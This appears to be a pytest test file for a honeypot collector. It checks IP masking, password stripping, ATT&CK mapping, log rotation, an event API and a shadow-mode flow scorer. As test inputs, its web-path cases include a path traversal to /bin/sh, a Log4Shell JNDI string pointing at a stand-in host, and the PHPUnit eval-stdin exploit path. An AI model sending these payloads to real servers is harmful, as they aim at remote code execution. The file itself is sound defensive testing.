"""Honeypot collector: hostile input, privacy (no full IPs, no passwords), ATT&CK mapping, log rotation, API."""
import gzip
import ipaddress
import json
import sys
import threading
import time

import pytest
from fastapi.testclient import TestClient

from conftest import ROOT

sys.path.insert(0, str(ROOT / "honeypot" / "collector"))
import collector as c  # noqa: E402


@pytest.fixture
def geo(tmp_path):
    p = tmp_path / "geo.csv.gz"
    with gzip.open(p, "wt") as f:
        f.write("1.0.0.0,1.255.255.255,AU\n8.8.8.0,8.8.8.255,US\n2001:db8::,2001:db8:ffff:ffff:ffff:ffff:ffff:ffff,DE\n")
    return c.Geo(p)


def line(logtype, src="8.8.8.8", **logdata):
    return json.dumps({"logtype": logtype, "src_host": src, "dst_port": 22, "utc_time": "2026-11-20 10:00:00.000001",
                       "logdata": logdata})


def test_ip_masking_and_country(geo):
    assert c.mask_ip(ipaddress.ip_address("8.8.8.8")) == "8.8.8.x"
    assert c.mask_ip(ipaddress.ip_address("2001:db8:1:2::5")) == "2001:db8:1::/48"
    assert geo.country(ipaddress.ip_address("8.8.8.8")) == "US"
    assert geo.country(ipaddress.ip_address("1.2.3.4")) == "AU"
    assert geo.country(ipaddress.ip_address("9.9.9.9")) == "ZZ"


def test_ssh_login_is_brute_force_and_never_keeps_the_password(geo):
    rec = c.parse_event(line(4002, USERNAME="root", PASSWORD="hunter2-secret"), geo, c.DailyHasher())
    assert rec["service"] == "SSH" and rec["technique"].startswith("T1110") and rec["country"] == "US"
    assert rec["src"] == "8.8.8.x" and "8.8.8.8" not in json.dumps(rec)
    assert "hunter2-secret" not in json.dumps(rec) and json.loads(rec["detail"]) == {"username": "root"}


@pytest.mark.parametrize("path, technique", [
    ("/", "T1595 Active Scanning"), ("/index.html", "T1595 Active Scanning"), ("/.env", "T1595.002 Vulnerability Scanning"),
    ("/cgi-bin/../../../../bin/sh", "T1190 Exploit Public-Facing Application"),
    ("/?x=${jndi:ldap://evil/a}", "T1190 Exploit Public-Facing Application"),
    ("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "T1190 Exploit Public-Facing Application"),
])
def test_web_paths(geo, path, technique):
    assert c.parse_event(line(3000, PATH=path), geo, c.DailyHasher())["technique"] == technique


def test_hostile_text_is_cleaned_and_capped(geo):
    rec = c.parse_event(line(4002, USERNAME="ad\x1b[31mmin\x00" + "A" * 500), geo, c.DailyHasher())
    name = json.loads(rec["detail"])["username"]
    assert "\x1b" not in name and "\x00" not in name and len(name) <= 65 and name.startswith("ad[31mmin")


@pytest.mark.parametrize("raw", ["not json", line(1001), line(4002, src="10.0.0.5"), line(4002, src="127.0.0.1"),
                                 line(4002, src="not-an-ip"), json.dumps([1, 2]), line(99999)])
def test_skips_noise_and_garbage(geo, raw):
    assert c.parse_event(raw, geo, c.DailyHasher()) is None


def test_ipv4_mapped_ipv6_is_treated_as_ipv4(geo):
    assert c.parse_event(line(4000, src="::ffff:8.8.8.8"), geo, c.DailyHasher())["src"] == "8.8.8.x"
    assert c.parse_event(line(4000, src="::ffff:10.1.2.3"), geo, c.DailyHasher()) is None


def test_source_hash_counts_within_a_day_only():
    h = c.DailyHasher()
    assert h("8.8.8.8", "2026-11-20") == h("8.8.8.8", "2026-11-20") != h("8.8.4.4", "2026-11-20")
    assert h("8.8.8.8", "2026-11-21") != c.DailyHasher()("8.8.8.8", "2026-11-21")  # new random key per process/day


def run_follow(log, steps, cursor=None):
    got, stop = [], threading.Event()
    t = threading.Thread(target=lambda: got.extend(c.follow(log, stop, cursor)), daemon=True)
    t.start()
    for step in steps:
        time.sleep(1)
        step()
    time.sleep(1.5)
    stop.set(); t.join(3)
    return [json.loads(x) for x in got]


def append(log, text):
    with log.open("a") as f:
        f.write(text)


def test_follow_waits_for_whole_lines(tmp_path):
    log = tmp_path / "opencanary.log"
    log.write_text('{"a": 1}\n{"b"')
    assert run_follow(log, [lambda: append(log, ': 2}\n')]) == [{"a": 1}, {"b": 2}]


def test_restart_resumes_from_the_saved_position(tmp_path):
    log, con = tmp_path / "opencanary.log", c.connect(tmp_path / "t.db")
    log.write_text('{"a": 1}\n')
    cursor = {}
    assert run_follow(log, [], cursor) == [{"a": 1}]
    c.save(con, None, cursor)
    append(log, '{"b": 2}\n')
    saved = dict(zip(("inode", "pos"), con.execute("SELECT inode, pos FROM cursor").fetchone()))
    assert run_follow(log, [], saved) == [{"b": 2}]  # a restarted collector does not store {"a": 1} again


@pytest.mark.skipif(sys.platform == "win32", reason="Windows cannot rename a file that is open; the honeypot runs on Linux")
def test_follow_survives_rotation(tmp_path):
    log = tmp_path / "opencanary.log"
    log.write_text('{"a": 1}\n')
    rotate = lambda: (log.rename(tmp_path / "opencanary.log.1"), log.write_text('{"c": 3}\n'))
    assert run_follow(log, [rotate]) == [{"a": 1}, {"c": 3}]


def test_api_serves_events_and_stats_without_hashes(geo, tmp_path):
    con, h = c.connect(tmp_path / "t.db"), c.DailyHasher()
    now = time.strftime("%Y-%m-%d %H:%M:%S.000001", time.gmtime())
    for raw in [line(4002, USERNAME="root"), line(4002, src="1.2.3.4", USERNAME="admin"), line(3000, PATH="/.env")]:
        rec = c.parse_event(raw.replace("2026-11-20 10:00:00.000001", now), geo, h)
        c.store(con, rec)
    client = TestClient(c.create_app(con, ingest=False))
    events = client.get("/api/events").json()
    assert len(events) == 3 and events[0]["path"] == "/.env" and all("src_hash" not in e for e in events)
    s = client.get("/api/stats").json()
    assert s["events"] == 3 and s["distinct_sources"] == 2 and s["login_attempts"] == 2
    assert {x["key"] for x in s["by_country"]} == {"US", "AU"} and s["usernames"][0]["count"] == 1
    assert client.get("/api/events?limit=500").status_code == 422


def test_firewall_opens_exactly_the_honeypot_ports_and_https():
    import re
    conf = json.loads((ROOT / "honeypot" / "opencanary" / "opencanary.conf").read_text())
    services = {v for k, v in conf.items() if k.endswith(".port") and conf.get(k[:-5] + ".enabled")}
    setup = (ROOT / "honeypot" / "setup-host.sh").read_text()
    opened = {int(p) for p in re.search(r'PUBLIC_PORTS="([\d,]+)"', setup).group(1).split(",")}
    admin = int(re.search(r"ADMIN_PORT=(\d+)", setup).group(1))
    assert opened == services | {443}  # 443: the tracker page; everything else is a fake service
    assert admin not in opened and 22 in services  # real SSH moves off 22, which the honeypot takes


# ---------------------------------------------------------------- shadow mode
sys.path.insert(0, str(ROOT / "honeypot" / "shadow"))
import score  # noqa: E402

MODEL = ROOT / "live" / "model"


def honeypot_ports():
    conf = json.loads((ROOT / "honeypot" / "opencanary" / "opencanary.conf").read_text())
    return {v for k, v in conf.items() if k.endswith(".port") and conf.get(k[:-5] + ".enabled")}


def test_shadow_mode_covers_exactly_the_honeypot_ports():
    import re
    capture = (ROOT / "honeypot" / "shadow" / "capture.sh").read_text()
    captured = {int(p) for p in re.search(r'PORTS="([\d ]+)"', capture).group(1).split()}
    assert captured == set(score.SERVICES) == honeypot_ports()
    assert 443 not in captured and 22022 not in captured  # never the tracker's visitors or the admin


def flow_csv(path, rows):
    """A flow file in the fixed CICFlowMeter's layout: identifiers first, then features under the tool's names."""
    feats = json.loads((MODEL / "card.json").read_text())["features_order"]
    tool = [{v: k for k, v in score.RENAME.items()}.get(f, f) for f in feats]
    head = ["Flow ID", "Src IP", "Src Port", "Dst IP", "Dst Port", "Timestamp"] + [t for t in tool if t != "Protocol"] + ["Protocol"]
    with path.open("w") as f:
        f.write(",".join(head) + "\n")
        for dst, port in rows:
            values = {"Flow ID": "x", "Src IP": "203.0.113.9", "Src Port": "40000", "Dst IP": dst, "Dst Port": str(port),
                      "Timestamp": "21/11/2026 06:15:02 PM", "Protocol": "6", "Total Fwd Packet": "3", "Total Bwd packets": "2",
                      "Flow Duration": "1500000"}
            f.write(",".join(values.get(h, "1") for h in head) + "\n")


def test_shadow_scores_inbound_honeypot_flows_and_stores_no_addresses(tmp_path):
    flows = tmp_path / "flows"
    flows.mkdir()
    flow_csv(flows / "x_Flow.csv", [("10.0.0.177", 22), ("10.0.0.177", 443), ("93.184.216.34", 80), ("10.0.0.177", 3389)])
    db = tmp_path / "t.db"
    assert score.main(flows, db, MODEL) == 2  # the tracker's 443 and the server's own outbound :80 are not scored
    con = __import__("sqlite3").connect(db)
    rows = con.execute("SELECT ts, service, port, packets, duration_s, decision FROM shadow ORDER BY port").fetchall()
    assert [(r[1], r[2], r[3], r[4]) for r in rows] == [("SSH", 22, 5, 1.5), ("RDP", 3389, 5, 1.5)]
    assert rows[0][0] == "2026-11-21T18:15:02Z" and {r[5] for r in rows} <= {"ALERT", "REVIEW", "ALLOW"}
    assert "203.0.113" not in json.dumps(con.execute("SELECT * FROM shadow").fetchall())
    columns = [r[1] for r in con.execute("PRAGMA table_info(shadow)")]
    assert not {"src", "src_ip", "dst_ip", "ip"} & set(columns)


def test_shadow_refuses_flows_without_the_model_features(tmp_path):
    (tmp_path / "f.csv").write_text("Dst IP,Dst Port,Timestamp\n10.0.0.1,22,x\n")
    with pytest.raises(ValueError, match="lacks model features"):
        score.main(tmp_path, tmp_path / "t.db", MODEL)


def test_shadow_api_summarises_decisions(tmp_path):
    con = c.connect(tmp_path / "t.db")
    now = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
    for service, decision in [("SSH", "REVIEW"), ("SSH", "ALLOW"), ("SSH", "ALERT"), ("RDP", "ALLOW")]:
        con.execute("INSERT INTO shadow (ts, service, decision) VALUES (?, ?, ?)", (now, service, decision))
    s = TestClient(c.create_app(con, ingest=False)).get("/api/shadow").json()
    assert s["flows"] == 4 and s["decisions"] == {"ALERT": 1, "REVIEW": 1, "ALLOW": 2} and s["flagged_share"] == 0.5
    assert s["by_service"][0] == {"key": "SSH", "ALERT": 1, "REVIEW": 1, "ALLOW": 1, "flows": 3}


def test_health_freshness_lets_an_uptime_monitor_notice_a_stalled_honeypot(tmp_path):
    con = c.connect(tmp_path / "t.db")
    client = TestClient(c.create_app(con, ingest=False))
    assert client.get("/api/health").status_code == 200                       # plain liveness, even with no events
    assert client.get("/api/health?fresh=3600").json()["status"] == "stale"   # nothing logged yet
    old = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() - 7200))
    con.execute("INSERT INTO events (ts, service) VALUES (?, 'SSH')", (old,))
    assert client.get("/api/health?fresh=3600").status_code == 503             # last attack 2 h ago
    assert client.get("/api/health?fresh=10800").status_code == 200            # within 3 h
    assert client.get("/api/health?fresh=5").status_code == 422                # nonsense windows are refused
